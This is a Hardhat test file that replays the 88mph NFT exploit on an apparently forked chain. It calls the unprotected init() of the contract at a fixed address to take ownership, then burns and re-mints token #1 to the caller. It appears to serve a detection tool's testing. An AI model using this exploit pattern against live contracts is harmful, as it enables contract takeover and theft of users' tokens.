import { ethers } from 'hardhat'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'
import { I88mph } from '../typechain-types'
import { expect } from 'chai'

describe('CCA Detects 88mph Attack Test', async function () {
    let mphNFT: I88mph
    let owner: SignerWithAddress
    let ownerAddress: string

    beforeEach(async () => {
        owner = (await ethers.getSigners())[0]
        ownerAddress = await owner.getAddress()
        mphNFT = await ethers.getContractAt('I88mph', '0xF0b7DE03134857391d8D43Ed48e20EDF21461097')
    })

    it('should block number equal to 12_516_705', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(12_516_705)
    })

    it('should detect 88mph attack', async function () {
        console.log('Before exploiting, NFT contract owner:', await mphNFT.owner())
        const tx = await mphNFT.connect(owner).init(ownerAddress, '0', '0')
        await tx.wait()
        console.log('After exploiting, NFT contract owner:', await mphNFT.owner())
        console.log('NFT Owner of #1: ', await mphNFT.ownerOf(1))
        // burn token 1
        const burnTx = await mphNFT.connect(owner).burn(1)
        await burnTx.wait()

        //const result = await mphNFT.ownerOf(1)
        await expect(mphNFT.ownerOf(1)).to.be.revertedWith('ERC721: owner query for nonexistent token')
        const mintTx = await mphNFT.connect(owner).mint(ownerAddress, 1)
        await mintTx.wait()
        const newOwner = await mphNFT.ownerOf(1)
        expect(newOwner).to.equal(ownerAddress)
        console.log('After exploiting: NFT Owner of #1: ', await mphNFT.ownerOf(1)) // token 1 now owned by us
    })
})
